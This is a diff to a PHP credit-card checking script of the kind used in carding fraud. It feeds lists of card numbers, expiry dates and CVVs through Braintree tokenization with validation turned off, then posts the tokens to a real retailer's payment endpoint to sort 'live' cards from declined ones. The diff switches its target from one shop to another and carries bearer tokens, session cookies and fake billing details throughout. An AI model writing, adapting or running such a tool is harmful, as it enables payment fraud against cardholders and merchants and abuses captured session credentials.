@@ -170,7 +170,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept: */*',
 'accept-encoding: gzip, deflate, br',
 'accept-language: en-US,en;q=0.9',
-'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6IkF1dGh5In0.eyJleHAiOjE1OTA0OTc4ODcsImp0aSI6IjBiYTFhMGJjLTgxZTMtNDQ1Ni1hYzUzLWQ0NzI2MTIxZTgyZCIsInN1YiI6ImM5ODYycm5xdDlyMzY5a3oiLCJpc3MiOiJBdXRoeSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImM5ODYycm5xdDlyMzY5a3oiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwib3B0aW9ucyI6e319.J-GjrOc5fGBGTo6KTpbx-lnIr7DyeQDAFbMp5v1NircDd_Tf6Gxd_NOfbbA1ZA4e1S8eg5KuILjITYK7HdABJw',
+'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6IkF1dGh5In0.eyJleHAiOjE1OTA0NjM1MjYsImp0aSI6ImNiNTkzYTBkLTBjMDYtNDVjYy1iZTYwLTViYzZmYWI4YmIzZCIsInN1YiI6IjU3Z214dDNzZHpxeXh0YmMiLCJpc3MiOiJBdXRoeSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjU3Z214dDNzZHpxeXh0YmMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJvcHRpb25zIjp7Im1lcmNoYW50X2FjY291bnRfaWQiOiJNTUxBRkxFVVJfaW5zdGFudCJ9fQ.e67EvmmwBgvbsRW8QyBQle8G5R6idAInsJ9PggUKUY49AiID5_3iffX55im6JpfZTQ9Rmq6MxpVUFBtJUVtZfg',
 'braintree-version: 2018-05-10',
 'content-type: application/json',
 'origin: https://assets.braintreegateway.com',
@@ -178,7 +178,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'user-agent: '.$browser.''
 ));
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"ea00c1f9-06df-4234-8ab7-e7146b422fa2"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"04bfa11a-48a9-428d-9134-ed94c0a623c3"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"10080"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
 
 
 $a_pago = curl_exec($ch);
@@ -201,7 +201,7 @@ $token = trim(strip_tags(getstr($a_pago,'"token":"','"')));
 // //////////////////////// START REQUEST 2 ////////////////////////
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://monkeyfingers.info/?wc-ajax=checkout');
+curl_setopt($ch, CURLOPT_URL, 'https://mmlafleur.com/api/v0/customers/?atst=sie0f4imns369v62ef02lg3l52');
 
 //////////////////////// PROXY CALLS ////////////////////////////
 //               REMOVE '//' FOR PROXIES TO WORK BELOW
@@ -226,22 +226,25 @@ curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PATCH');
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'accept: application/json, text/javascript, */*; q=0.01',
+'accept: */*',
 'accept-encoding: gzip, deflate, br',
 'accept-language: en-US,en;q=0.9',
-'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'cookie: trustedsite_visit=1; trustedsite_tm_float_seen=1; _sp_ses.0a28=*; woocommerce_items_in_cart=1; woocommerce_cart_hash=33510cf7bf43f13d046b46cafb5f43c4; tk_ai=woo%3AZyCyN7enhL353Gkk8B9HCXU4; wordpress_logged_in_8ab0331c481370e1a61d1d8f2be2ac02=hotshot69%7C1591621025%7Cg5RJmJOOvTBm7eKiaF0NCxCKWRfyd0rElfTadAEksap%7Cc7fb897237730b247ab0bca84b8b31609092b6b0d6e9c1b19f9ee5db995370e3; wp_woocommerce_session_8ab0331c481370e1a61d1d8f2be2ac02=50%7C%7C1590584177%7C%7C1590580577%7C%7C9715862e51e9a425d1fe36c9c88c69f6; _sp_id.0a28=8e3d0e7659cccd79.1590411368.1.1590411513.1590411368',
-'origin: https://monkeyfingers.info',
-'referer: https://monkeyfingers.info/checkout/',
+'authorization: Bearer 4207d59fb6f4b4f8339734353640d98a',
+'content-type: application/json',
+
+'cookie: mmlf_conv=%7B%22http_referrer%22%3A%22%22%2C%22utm_campaign%22%3A%22%22%2C%22utm_source%22%3A%22%22%2C%22utm_medium%22%3A%22%22%2C%22utm_term%22%3A%22%22%2C%22utm_content%22%3A%22%22%2C%22referral_id%22%3A%22%22%2C%22browser_type%22%3A%22chrome%22%2C%22device_type%22%3A%22desktop%20-%20pc%22%7D; mmlf_track=%7B%22http_referrer%22%3A%22%22%2C%22utm_campaign%22%3A%22%22%2C%22utm_source%22%3A%22%22%2C%22utm_medium%22%3A%22%22%2C%22utm_term%22%3A%22%22%2C%22utm_content%22%3A%22%22%2C%22referral_id%22%3A%22%22%2C%22browser_type%22%3A%22chrome%22%2C%22device_type%22%3A%22desktop%20-%20pc%22%7D; _ALGOLIA=393703db-2966-4c4b-8e28-af89473c8307; mmlf_hasOrdered=0; frontend_cid=jSvbCSQPTGeqelIN; kustomer-chat=%7B%22noIcon%22%3Atrue%7D; ftr_ncd=6; __wid=446040818; forterToken=13a6f0e257cd437a88d1dbcf49b9455f_1590413284681__UDF43_6; ajs_group_id=null; ajs_anonymous_id=%22dad00d55-c4e3-485c-8094-9607aa6a3607%22; _sp_ses.651f=*; _sp_id.651f=d2175d766b66dd18.1590413298.1.1590413299.1590413298; am_promo_notification=0; frontend=sie0f4imns369v62ef02lg3l52; pslogin_show_link_popup=1; ajs_user_id=%22549920%22; sut=4207d59fb6f4b4f8339734353640d98a; sst=sie0f4imns369v62ef02lg3l52; fpp=null',
+'origin: https://mmlafleur.com',
+'referer: https://mmlafleur.com/checkout/payment',
 'user-agent: '.$browser.''
 ));
 
 //////////////////////// START POST FILED 1 ////////////////////////
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Vincent&billing_last_name=Warner&billing_company=Lmao&billing_country=US&billing_address_1=12+avenue&billing_address_2=&billing_city=Miami&billing_state=FL&billing_postcode=33101&billing_phone=05182641524&billing_email=vvarner3%40gmail.com&shipping_first_name=Vincent&shipping_last_name=Warner&shipping_company=Lmao&shipping_country=US&shipping_address_1=12+avenue&shipping_address_2=&shipping_city=Miami&shipping_state=FL&shipping_postcode=33101&shipping_phone=05182641524&order_comments=&shipping_method%5B0%5D=free_shipping%3A3&payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=0&wc-braintree-credit-card-3d-secure-order-total=10.99&wc_braintree_credit_card_payment_nonce='.$token.'&wc_braintree_paypal_payment_nonce=&wc_braintree_paypal_amount=10.99&wc_braintree_paypal_currency=USD&wc_braintree_paypal_locale=en_us&terms=on&terms-field=1&woocommerce-process-checkout-nonce=5893683bfc&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{"payment_methods":[{"token":"'.$token.'","default":true}]}');
 
 // // // //*****************************************************************************************************************************************************************************************************************************************************************************
 
@@ -251,14 +254,14 @@ if (curl_errno($ch)) {
     echo 'Error:'.curl_error($ch);
 }
 curl_close($ch);
-// $message = trim(strip_tags(getstr($result,'<li>Status code ','</li>')));
-// // $code = trim(strip_tags(getstr($result,'"message":"','"')));
-// // // $message2 = trim(strip_tags(getstr($result,'"message": "','"')));
+$message = trim(strip_tags(getstr($result,'"technical":"','"')));
+// $code = trim(strip_tags(getstr($result,'"message":"','"')));
+// // $message2 = trim(strip_tags(getstr($result,'"message": "','"')));
 
 
 
-// /////////////////////// RESULT ////////////////////////////////////
-if(strpos($result,'"result":"success"')){
+/////////////////////// RESULT ////////////////////////////////////
+if(strpos($result,'"created_at"')){
 // updatecart();
         echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ L I V 3 ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
 
@@ -270,7 +273,7 @@ elseif(strpos($result,'Status code avs')) {
   }
 
 else {
-      echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ D 3 C L I N 3 ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
+      echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
 
   }
 curl_close($curl);
